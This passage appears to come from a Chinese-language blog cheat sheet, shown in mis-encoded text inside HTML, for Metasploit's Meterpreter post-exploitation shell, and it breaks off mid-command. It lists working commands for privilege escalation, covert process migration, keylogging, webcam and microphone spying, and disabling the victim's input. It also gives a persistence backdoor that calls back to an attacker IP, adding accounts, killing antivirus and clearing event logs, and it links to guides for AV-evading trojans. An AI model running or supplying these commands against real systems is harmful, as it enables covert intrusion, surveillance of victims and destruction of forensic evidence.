ä½œä¸ºæ¸—é€æ¨¡å—æœ‰å¾ˆå¤šæœ‰ç”¨çš„åŠŸèƒ½ï¼Œæ¯”å¦‚æ·»åŠ ä¸€ä¸ªç”¨æˆ·ã€éšè—ä¸€äº›ä¸œè¥¿ã€æ‰“å¼€ shellã€å¾—åˆ°ç”¨æˆ·å¯†ç ã€ä¸Šä¼ ä¸‹è½½è¿œç¨‹ä¸»æœºçš„æ–‡ä»¶ã€è¿è¡Œ cmd.exeã€æ•æ‰å±å¹•ã€å¾—åˆ°è¿œç¨‹æ§åˆ¶æƒã€æ•è·æŒ‰é”®ä¿¡æ¯ã€æ¸…é™¤åº”ç”¨ç¨‹åºã€æ˜¾ç¤ºè¿œç¨‹ä¸»æœºçš„ç³»ç»Ÿä¿¡æ¯ã€æ˜¾ç¤ºè¿œç¨‹æœºå™¨çš„ç½‘ç»œæ¥å£å’Œ IP åœ°å€ç­‰ä¿¡æ¯ã€‚</p>\n</li>\n<li class=\"lvl-3\">\n<p>å¦å¤– Meterpreter èƒ½å¤Ÿèº²é¿å…¥ä¾µæ£€æµ‹ç³»ç»Ÿã€‚åœ¨è¿œç¨‹ä¸»æœºä¸Šéšè—è‡ªå·±ï¼Œå®ƒä¸æ”¹å˜ç³»ç»Ÿç¡¬ç›˜ä¸­çš„æ–‡ä»¶ï¼Œå› æ­¤ HIDS [åŸºäºä¸»æœºçš„å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ] å¾ˆéš¾å¯¹å®ƒåšå‡ºå“åº”ã€‚æ­¤å¤–å®ƒåœ¨è¿è¡Œçš„æ—¶å€™ç³»ç»Ÿæ—¶é—´æ˜¯å˜åŒ–çš„ï¼Œæ‰€ä»¥è·Ÿè¸ªå®ƒæˆ–è€…ç»ˆæ­¢å®ƒéå¸¸å›°éš¾ã€‚</p>\n</li>\n<li class=\"lvl-3\">\n<p>Meterpreter çš„å·¥ä½œæ¨¡å¼æ˜¯çº¯å†…å­˜çš„ï¼Œå¥½å¤„æ˜¯å¯åŠ¨éšè—ï¼Œå¾ˆéš¾è¢«æ€æ¯’è½¯ä»¶ç›‘æµ‹åˆ°ã€‚ä¸éœ€è¦è®¿é—®ç›®æ ‡ä¸»æœºç£ç›˜ï¼Œæ‰€ä»¥ä¹Ÿæ²¡ä»€ä¹ˆå…¥ä¾µçš„ç—•è¿¹ã€‚</p>\n</li>\n</ol>\n</div>\n<h2 id=\"åŸºæœ¬å‘½ä»¤\"><a class=\"anchor\" href=\"#åŸºæœ¬å‘½ä»¤\">#</a> åŸºæœ¬å‘½ä»¤</h2>\n<div class=\"note info\">\n<p>ä»¥ä¸‹å‘½ä»¤æ˜¯é’ˆå¯¹ meterpreter å½“å‰ä¼šè¯çš„æ“ä½œã€‚<br />\nmeterpreter&gt; æ”¯æŒ tab å‘½ä»¤è¡¥å…¨</p>\n</div>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">help</span>              <span class=\"token comment\"># æŸ¥çœ‹ Meterpreter å¸®åŠ©</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>background        <span class=\"token comment\"># è¿”å›ï¼ŒæŠŠ meterpreter åå°æŒ‚èµ·</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>bgkill            <span class=\"token comment\"># æ€æ­»ä¸€ä¸ªèƒŒæ™¯ meterpreter è„šæœ¬</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>bglist            <span class=\"token comment\"># æä¾›æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„åå°è„šæœ¬çš„åˆ—è¡¨</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>runå’Œbgrun        <span class=\"token comment\"># å‰å°å’Œåå°æ‰§è¡Œä»¥åå®ƒé€‰å®šçš„ meterpreter è„šæœ¬</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>channel           <span class=\"token comment\"># æ˜¾ç¤ºæ´»åŠ¨é¢‘é“</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sessions <span class=\"token parameter variable\">-i</span> n <span class=\"token comment\"># ä¸ä¼šè¯è¿›è¡Œäº¤äº’ï¼Œn è¡¨ç¤ºç¬¬ n ä¸ª session, ä½¿ç”¨ session -i è¿æ¥åˆ°æŒ‡å®šåºå·çš„ meterpreter ä¼šè¯å·²ç»§ç»­åˆ©ç”¨</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>sesssions <span class=\"token parameter variable\">-k</span>  number <span class=\"token comment\">#ä¸ä¼šè¯è¿›è¡Œäº¤äº’</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>close             <span class=\"token comment\"># å…³é—­é€šé“</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token builtin class-name\">exit</span>              <span class=\"token comment\"># ç»ˆæ­¢ meterpreter ä¼šè¯</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>quit              <span class=\"token comment\"># ç»ˆæ­¢ meterpreter ä¼šè¯</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>interact <span class=\"token function\">id</span>       <span class=\"token comment\"># åˆ‡æ¢è¿›ä¸€ä¸ªä¿¡é“</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>run               <span class=\"token comment\"># æ‰§è¡Œä¸€ä¸ªå·²æœ‰çš„æ¨¡è¾“å…¥ run åæŒ‰ä¸¤ä¸‹ tabï¼Œä¼šåˆ—å‡ºæ‰€æœ‰</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>irb               <span class=\"token comment\"># è¿›å…¥ Ruby è„šæœ¬æ¨¡å¼</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token builtin class-name\">read</span>              <span class=\"token comment\"># ä»é€šé“è¯»å–æ•°æ®</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">write</span>             <span class=\"token comment\"># å°†æ•°æ®å†™å…¥åˆ°ä¸€ä¸ªé€šé“</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>use               <span class=\"token comment\"># åŠ è½½ meterpreter çš„æ‰©å±•</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>load/use          <span class=\"token comment\"># åŠ è½½æ‹“å±•åº“ä¸­çš„æ¨¡å—</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>Resource          <span class=\"token comment\"># æ‰§è¡Œä¸€ä¸ªå·²æœ‰çš„ rc è„šæœ¬ï¼Œ.rc æ–‡ä»¶</span></pre></td></tr></table></figure><p>â­ç•™æ„ä¸€ä¸‹ï¼š <code>load</code> ã€ <code>run</code>  ä¹‹åä¸¤ä¸‹<span class=\"kbd yellow\"> tab</span> ä¼šåˆ—å‡ºæ‰€æœ‰çš„å·²æœ‰çš„è„šæœ¬ï¼Œå¸¸ç”¨çš„æœ‰ autorouteï¼Œhashdumpï¼Œarp_scannerï¼Œmulti_meter_inject ç­‰</p>\n<h2 id=\"æ–‡ä»¶æ“ä½œ\"><a class=\"anchor\" href=\"#æ–‡ä»¶æ“ä½œ\">#</a> æ–‡ä»¶æ“ä½œ</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>getwd <span class=\"token punctuation\">;</span> <span class=\"token builtin class-name\">pwd</span>  <span class=\"token operator\">&amp;&amp;</span> lpwd      <span class=\"token comment\"># æŸ¥çœ‹å½“å‰å·¥ä½œç›®å½•  </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">ls</span>  <span class=\"token operator\">&amp;&amp;</span>  lls   </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">cd</span>  <span class=\"token operator\">&amp;&amp;</span>  lcd               <span class=\"token comment\"># lcd/lpwd/lls ä½œç”¨äºæœ¬åœ°</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">mkdir</span> lltest2             <span class=\"token comment\"># åªèƒ½åœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶å¤¹</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">rmdir</span> lltest2             <span class=\"token comment\"># åªèƒ½åˆ é™¤å½“å‰ç›®å½•ä¸‹æ–‡ä»¶å¤¹</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>getlwd   æˆ–è€… lpwd         <span class=\"token comment\"># æ“ä½œæ”»å‡»è€…ä¸»æœº æŸ¥çœ‹å½“å‰ç›®å½•</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>lcd /tmp                  <span class=\"token comment\"># æ“ä½œæ”»å‡»è€…ä¸»æœº åˆ‡æ¢ç›®å½•</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">cat</span> c:<span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span>test<span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span>passwd.txt  <span class=\"token comment\"># æŸ¥çœ‹æ–‡ä»¶å†…å®¹</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>upload <span class=\"token operator\">&lt;</span>æœ¬æœºè·¯å¾„<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>é¶æœºè·¯å¾„<span class=\"token operator\">></span>  <span class=\"token comment\"># ä¸Šä¼ æ–‡ä»¶åˆ°ç›®æ ‡æœºä¸Šï¼Œå¦‚ï¼š</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>upload /tmp/hack.txt C:<span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span>test </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>download <span class=\"token operator\">&lt;</span>é¶æœºè·¯å¾„<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>æœ¬æœºè·¯å¾„<span class=\"token operator\">></span>   <span class=\"token comment\"># ä¸‹è½½æ–‡ä»¶åˆ°æœ¬æœºä¸Šï¼Œå¦‚ï¼š</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>download c:<span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span>test<span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span>passwd.txt /tmp/</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>edit <span class=\"token operator\">&lt;</span>é¶æœºfile<span class=\"token operator\">></span>            <span class=\"token comment\"># ç¼–è¾‘æˆ–åˆ›å»ºæ–‡ä»¶  æ²¡æœ‰çš„è¯ï¼Œä¼šæ–°å»ºæ–‡ä»¶</span></pre></td></tr></table></figure><h2 id=\"ç³»ç»Ÿå‘½ä»¤\"><a class=\"anchor\" href=\"#ç³»ç»Ÿå‘½ä»¤\">#</a> ç³»ç»Ÿå‘½ä»¤</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>getsystem       <span class=\"token comment\"># ä¼šè‡ªåŠ¨åˆ©ç”¨å„ç§å„æ ·çš„ç³»ç»Ÿæ¼æ´æ¥è¿›è¡Œæƒé™æå‡</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>getuid          <span class=\"token comment\"># æŸ¥çœ‹å¯¹æ–¹æ­£åœ¨è¿è¡Œçš„ç”¨æˆ·</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">ps</span>              <span class=\"token comment\"># åˆ—å‡ºæ‰€æœ‰çš„è¿›ç¨‹</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>getpid          <span class=\"token comment\"># è¿”å›è¿è¡Œ meterpreter æœ¨é©¬çš„ id å·</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>sysinfo         <span class=\"token comment\"># æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯å’Œä½“ç³»ç»“æ„</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>shell           <span class=\"token comment\"># åˆ‡æ¢åˆ° cmd çš„ç³»ç»Ÿæƒé™æ–¹å¼\t</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token builtin class-name\">exit</span>            <span class=\"token comment\"># é€€å‡º shell ä¼šè¯è¿”å› meterpreterï¼ˆåœ¨ shell ä¸­ï¼‰æˆ–ç»ˆæ­¢ meterpreterï¼ˆåœ¨ meterpreterï¼‰</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>migrate <span class=\"token operator\">&lt;</span>è¿›ç¨‹id<span class=\"token operator\">></span>    </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># è¿›ç¨‹ id è¿›ç¨‹è¿ç§»ï¼Œå°†æœ¬è¿›ç¨‹ç»‘å®šåˆ°æ­£å¸¸çš„åˆæ³•è¿›ç¨‹ï¼Œmeterpreter æœ¨é©¬è¿›ç¨‹è¿ç§»è‡³å…¶ä»–è¿›ç¨‹ä¸­ï¼Œå¦‚æ¡Œé¢å›¾å½¢åŒ–è¿›ç¨‹ï¼Œä»è€Œç»´æŒæƒé™ã€‚</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>arp             <span class=\"token comment\"># æŸ¥çœ‹ arp</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>getdesktop      <span class=\"token comment\"># æˆªå–ç›®æ ‡ä¸»æœºå½“å‰æ¡Œé¢ä¼šè¯çª—å£</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>run webcam <span class=\"token parameter variable\">-p</span> /var/www    <span class=\"token comment\"># åœ¨ /var/www ç›®å½•ç›‘æ§ç›®æ ‡ä¸»æœºçš„æ‘„åƒå¤´</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>keylog_recorder   <span class=\"token comment\"># ä½¿ç”¨ migrate å°†ä¼šè¯è¿ç§»è‡³ explorer.exe çš„è¿›ç¨‹ç©ºé—´åè®°å½•é”®ç›˜</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>background     <span class=\"token comment\"># æŠŠå½“å‰çš„ä¼šè¯è®¾ç½®ä¸ºèƒŒæ™¯ï¼Œéœ€è¦çš„æ—¶å€™åœ¨å¯ç”¨</span></pre></td></tr></table></figure><p><span class=\"yellow\">æ³¨ï¼šæ‰§è¡Œ getsystem å‘½ä»¤åï¼Œä¼šæ˜¾ç¤ºé”™è¯¯ï¼Œä½†æ˜¯å…¶å®å·²ç»è¿è¡ŒæˆåŠŸäº†ï¼</span></p>\n<details class=\"info\"><summary>ç‰¹æ„è¯´ä¸€ä¸‹`migrate`</summary><div>\n<div class=\"tab\" data-id=\"id2\" data-title=\"ç»‘å®šè¿›ç¨‹\">\n<p><em>å†ä¼ é©¬æˆåŠŸè¿è¡Œåï¼Œæˆ‘ä»¬ä¸€èˆ¬çš„æ€è·¯é¦–å…ˆå°±æ˜¯éšè”½è¿è¡Œï¼Œç„¶åæ˜¯å·©å›ºæˆ˜æœç­‰æ“ä½œã€‚</em></p>\n<ul class=\"lvl-2\">\n<li class=\"lvl-2\">\n<p>éšè”½è¿è¡Œæ—¶æˆ‘ä»¬å¸¸ä¼šç”¨åˆ°è¿›ç¨‹è¿ç§»ï¼Œå°†å®ƒç»‘å®šåˆ°æ­£å¸¸çš„åˆæ³•è¿›ç¨‹.</p>\n</li>\n<li class=\"lvl-2\">\n<p>åœ¨ç»‘å®šç›®æ ‡ pid çš„æ—¶å€™ï¼Œç»å¸¸ä¼šæ–­äº† shellã€‚è¿›ç¨‹è¿ç§»åä¼šè‡ªåŠ¨å…³é—­åŸæ¥ Meterpreter è¿›ç¨‹ï¼Œæ²¡æœ‰å…³é—­å¯ä½¿ç”¨  <code>kill pid</code>  å‘½ä»¤å…³é—­è¿›ç¨‹ã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p>æˆ–è€…ä½¿ç”¨è‡ªåŠ¨è¿ç§»è¿›ç¨‹ï¼ˆ <code>run post/windows/manage/migrate</code> ï¼‰å‘½ä»¤ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨å¯»æ‰¾åˆé€‚çš„è¿›ç¨‹ç„¶åè¿ç§»ã€‚</p>\n</li>\n</ul>\n</div>\n<div class=\"tab\" data-id=\"id2\" data-title=\"[å¯èƒ½çš„æ„å¤–].\">\n<ul class=\"lvl-2\">\n<li class=\"lvl-2\">\n<p>è¢«ç»‘è¿›ç¨‹çº§åˆ«å¤ªé«˜ï¼Œå¦‚ explorer.exe å§ï¼Œè™½ç„¶å®ƒä¸€å®šå­˜åœ¨ï¼Œä½†ä½ çœŸçš„ä¸ä¸€å®šèƒ½æ†ä¸Šå®ƒï¼Œè¯•ç€æ¢ç‚¹æƒé™ä½çš„è¿›ç¨‹å§ã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p>å³ä½¿ä½ æ†åˆ°äº†æ­£å¸¸çš„è¿›ç¨‹ï¼Œä½ èƒ½ä¿è¯å®ƒä¸‹æ¬¡è¿è¡Œæ—¶æ­£å¸¸å¯ç€åŠ¨ä¹ˆï¼Ÿåœ¨æµ‹è¯•ä¸­ä»—ç€å…æ€æ†åˆ°äº† QQ ç”µè„‘ç®¡å®¶çš„å­è¿›ç¨‹ä¸Šï¼Œç»“æœåœ¨é‡å¯æ˜¯ï¼ŒQQ ç”µè„‘ç®¡å®¶åœ¨å¯åŠ¨æ—¶è²Œä¼¼å¯¹å¯åŠ¨é¡¹è¿›è¡Œäº†æ£€æŸ¥ï¼Œæœ€ç»ˆ QQ ç”µè„‘ç®¡å®¶æŠ¥é”™ï¼Œæœªèƒ½æ­£å¸¸å¯åŠ¨ï¼Œå½“ç„¶ï¼Œæˆ‘ä»¬çš„æœ¨é©¬ä¹Ÿå°±å‡‰äº†ã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p>ä¸è¦è®¤ä¸ºè¿ç§»è¿›ç¨‹æ“ä½œæ˜¯ä¸€ä¸ªå¤šä¹ˆä½æƒé™éšæ„çš„å·¥ä½œï¼Œå¼ºçƒˆå»ºè®®åœ¨æ­¤ä¹‹å‰è¯·åšæ›´åˆçº§çš„ä¿¡æ¯æœé›†å·¥ä½œï¼Œä»¥ä¿ä½ æ­¤è¡Œè‡³å°‘ä¸æ˜¯ç©ºæ‰‹è€Œå½’ã€‚åŒ…æ‹¬ migrate åœ¨å†…ï¼Œå¤§é‡é«˜æƒé™å‘½ä»¤æˆ–ä¸Šä¼ ä¸‹è½½å¤§ä½“ç§¯æ–‡ä»¶å‘½ä»¤éƒ½ä¼šå› ä¸ºåŒæ–¹ç½‘ç»œè´¨é‡ç­‰åŸå› å¯¼è‡´ä¼šè¯æ­»äº¡ï¼Œæ²¡æœ‰å¬é”™ï¼Œä¸æ˜¯å®Œå…¨æ–­å¼€ï¼Œä½†ä¸ä¼šå†æœ‰å›åº”ã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p>ç›®æ ‡ PC ç¯å¢ƒå¯¹æœ¨é©¬åŠŸèƒ½å½±å“å¾ˆå¤§ï¼Œè¦è®°ä½ï¼Œå°±ç®—æ˜¯ win10 ä¹Ÿæœ‰è¢«æ‰“å¼€æ‘„åƒå¤´å’Œéº¦çš„æƒ…å†µï¼Œå°±ç®—æ˜¯ winXP ä¹Ÿæœ‰ ps ä¸å‡ºæ¥ä¸œè¥¿çš„æƒ…å†µ</p>\n<p>From <a href=\"https://www.freebuf.com/articles/web/203009.html\">Metasploit å…¥é—¨ç³»åˆ— (å)â€”â€”Meterpreter (ä¸‰) - FreeBuf ç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>\n</li>\n</ul>\n</div>\n</div></details>\n<h2 id=\"è¿œç¨‹æ¡Œé¢\"><a class=\"anchor\" href=\"#è¿œç¨‹æ¡Œé¢\">#</a> è¿œç¨‹æ¡Œé¢</h2>\n<p>é¶æœºä¸º windows æ—¶ä½¿ç”¨</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>run getgui <span class=\"token parameter variable\">-e</span>                <span class=\"token comment\"># å¼€å¯è¿œç¨‹æ¡Œé¢</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>enumdesktops                 <span class=\"token comment\"># æŸ¥çœ‹å¯ç”¨çš„æ¡Œé¢</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>getdesktop                   <span class=\"token comment\"># è·å–å½“å‰ meterpreter å…³è”çš„æ¡Œé¢</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>set_desktop                  <span class=\"token comment\"># è®¾ç½® meterpreter å…³è”çš„æ¡Œé¢  -h æŸ¥çœ‹å¸®åŠ©</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>screenshot                   <span class=\"token comment\"># æˆªå±</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>use espia                    <span class=\"token comment\"># æˆ–è€…ä½¿ç”¨ espia æ¨¡å—æˆªå±  ç„¶åè¾“å…¥ screengrab</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>run vnc                      <span class=\"token comment\"># ä½¿ç”¨ vnc è¿œç¨‹æ¡Œé¢è¿æ¥ï¼Œ(è¿™æ–¹æ³•æœ‰ç‚¹é—®é¢˜ï¼Œä¸Šä¼ äº† exe ä½†æ˜¯å¯åŠ¨ä¸äº†)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>run sound_recorder           <span class=\"token comment\"># å£°éŸ³è®°å½•</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>run webcam                   <span class=\"token comment\"># å¼€å¯æ‘„åƒå¤´</span></pre></td></tr></table></figure><h2 id=\"é”®ç›˜-æ‘„åƒå¤´çªƒå–\"><a class=\"anchor\" href=\"#é”®ç›˜-æ‘„åƒå¤´çªƒå–\">#</a> é”®ç›˜ã€æ‘„åƒå¤´çªƒå–</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>keyscan_start                    <span class=\"token comment\"># å¼€å§‹é”®ç›˜è®°å½•</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>keyscan_dump                     <span class=\"token comment\"># å¯¼å‡ºè®°å½•æ•°æ®</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>keyscan_stop                     <span class=\"token comment\"># ç»“æŸé”®ç›˜è®°å½•</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>uictl  disable<span class=\"token punctuation\">(</span>enable<span class=\"token punctuation\">)</span> keyboard  <span class=\"token comment\"># ç¦æ­¢ (å…è®¸) ç›®æ ‡ä½¿ç”¨é”®ç›˜</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>uictl  disable<span class=\"token punctuation\">(</span>enable<span class=\"token punctuation\">)</span> mouse     <span class=\"token comment\"># ç¦æ­¢ (å…è®¸) ç›®æ ‡ä½¿ç”¨é¼ æ ‡</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>webcam_list                      <span class=\"token comment\"># è·å–ç›®æ ‡ç³»ç»Ÿçš„æ‘„åƒå¤´åˆ—è¡¨</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>webcam_snap                      <span class=\"token comment\"># ä»æŒ‡å®šçš„æ‘„åƒå¤´ï¼Œæ‹æ‘„ç…§ç‰‡</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>webcam_stream                    <span class=\"token comment\"># ä»æŒ‡å®šçš„æ‘„åƒå¤´ï¼Œå¼€å¯è§†é¢‘</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>run vnc                          <span class=\"token comment\"># å±å¹•å®æ—¶ç›‘æ§ã€‚</span></pre></td></tr></table></figure><h2 id=\"æ¤å…¥åé—¨\"><a class=\"anchor\" href=\"#æ¤å…¥åé—¨\">#</a> æ¤å…¥åé—¨</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>run persistence â€“h               <span class=\"token comment\"># æŸ¥çœ‹å¸®åŠ©</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>run persistence <span class=\"token parameter variable\">-X</span> <span class=\"token parameter variable\">-i</span> <span class=\"token number\">5</span> <span class=\"token parameter variable\">-p</span> <span class=\"token number\">4444</span> <span class=\"token parameter variable\">-r</span> <span class=\"token number\">192.168</span>.81.129</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># -X æŒ‡å®šå¯åŠ¨çš„æ–¹å¼ä¸ºå¼€æœºè‡ªå¯åŠ¨ï¼›-i åå‘è¿æ¥çš„æ—¶é—´é—´éš”ï¼›â€“r æŒ‡å®šæ”»å‡»è€…çš„ ip</span></pre></td></tr></table></figure><h2 id=\"è¿è¡Œé¶æœºç¨‹åº\"><a class=\"anchor\" href=\"#è¿è¡Œé¶æœºç¨‹åº\">#</a> è¿è¡Œé¶æœºç¨‹åº</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># execute å‘½ä»¤ç”¨æ³•ï¼š</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>execute <span class=\"token punctuation\">[</span>å‚æ•°<span class=\"token punctuation\">]</span> <span class=\"token parameter variable\">-f</span> æŒ‡å®šçš„å¯æ‰§è¡Œæ–‡ä»¶</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>-fï¼šæŒ‡å®šå¯æ‰§è¡Œæ–‡ä»¶</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-Hï¼šåˆ›å»ºä¸€ä¸ªéšè—è¿›ç¨‹</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>-aï¼šä¼ é€’ç»™å‘½ä»¤çš„å‚æ•°</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>-iï¼šè·Ÿè¿›ç¨‹è¿›è¡Œäº¤äº’</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>-mï¼šä»å†…å­˜ä¸­æ‰§è¡Œ</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>-tï¼šä½¿ç”¨å½“å‰ä¼ªé€ çš„çº¿ç¨‹ä»¤ç‰Œè¿è¡Œè¿›ç¨‹</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>-sï¼šåœ¨ç»™å®šä¼šè¯ä¸­æ‰§è¡Œè¿›ç¨‹</pre></td></tr></table></figure><h2 id=\"æ·»åŠ ç”¨æˆ·\"><a class=\"anchor\" href=\"#æ·»åŠ ç”¨æˆ·\">#</a> æ·»åŠ ç”¨æˆ·</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>run getgui <span class=\"token parameter variable\">-u</span> <span class=\"token operator\">&lt;</span>ç”¨æˆ·<span class=\"token operator\">></span> <span class=\"token parameter variable\">-p</span> <span class=\"token operator\">&lt;</span>å¯†ç <span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>run getgui <span class=\"token parameter variable\">-u</span> user1 <span class=\"token parameter variable\">-p</span> <span class=\"token number\">123</span>   <span class=\"token comment\"># æ·»åŠ ç”¨æˆ·ï¼Œç”¨æˆ·å userï¼Œå¯†ç  123</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>run getgui <span class=\"token parameter variable\">-f</span> <span class=\"token number\">4444</span> â€“e        <span class=\"token comment\"># 3389 ç«¯å£è½¬å‘åˆ° 6661</span></pre></td></tr></table></figure><h2 id=\"ç”Ÿæˆåé—¨\"><a class=\"anchor\" href=\"#ç”Ÿæˆåé—¨\">#</a> ç”Ÿæˆåé—¨</h2>\n<p><code>meterpreter</code>  æ˜¯åŸºäº <code>å†…å­˜DLL</code>  å»ºç«‹çš„è¿æ¥ï¼Œæ‰€ä»¥ï¼Œåªè¦ç›®æ ‡ä¸»æœºå…³æœºï¼Œæˆ‘ä»¬çš„è¿æ¥å°±ä¼šæ–­ã€‚</p>\n<p>è¿™ç¯‡å†™çš„å¤ªå¥½äº†ï¼Œç›´æ¥å¼•ç”¨</p>\n<p><a href=\"https://www.cnblogs.com/tomyyyyy/p/15178866.html\">msfvenomâ€”â€” æœ¨é©¬å…æ€ç¯‡ - tomyyyyy - åšå®¢å›­ (cnblogs.com)</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_44677409/article/details/96346481\">Metasploitâ€”â€”msfvenom å…æ€æœ¨é©¬_-f py -o-CSDN åšå®¢</a></p>\n<p><a href=\"https://blog.csdn.net/qq_42094992/article/details/109004560\">MSF ç”Ÿæˆåé—¨æ±‡æ€»_msfvenom linux/shell/reverse_tcp-CSDN åšå®¢</a></p>\n<h2 id=\"äº§åæŠ¤ç†\"><a class=\"anchor\" href=\"#äº§åæŠ¤ç†\">#</a> äº§åæŠ¤ç†</h2>\n<p>æ”»å‡»çš„æ‰€æœ‰æ“ä½œéƒ½è¢«è®°å½•åœ¨äº†ç³»ç»Ÿæ—¥å¿—æ–‡ä»¶ä¸­ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ¸…ç†æ—¥å¿—ã€‚</p>\n<pre><code>clearev  #æ¸…é™¤äº‹ä»¶æ—¥å¿—\n</code></pre>\n<h1 id=\"postæ¨¡å—\"><a class=\"anchor\" href=\"#postæ¨¡å—\">#</a> POST æ¨¡å—</h1>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>run killav        <span class=\"token comment\"># å¯èƒ½å¯¼è‡´ç›®æ ‡æœºå™¨è“å±æ­»æœº</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>run post/windows/gather/enum_computers <span class=\"token comment\"># 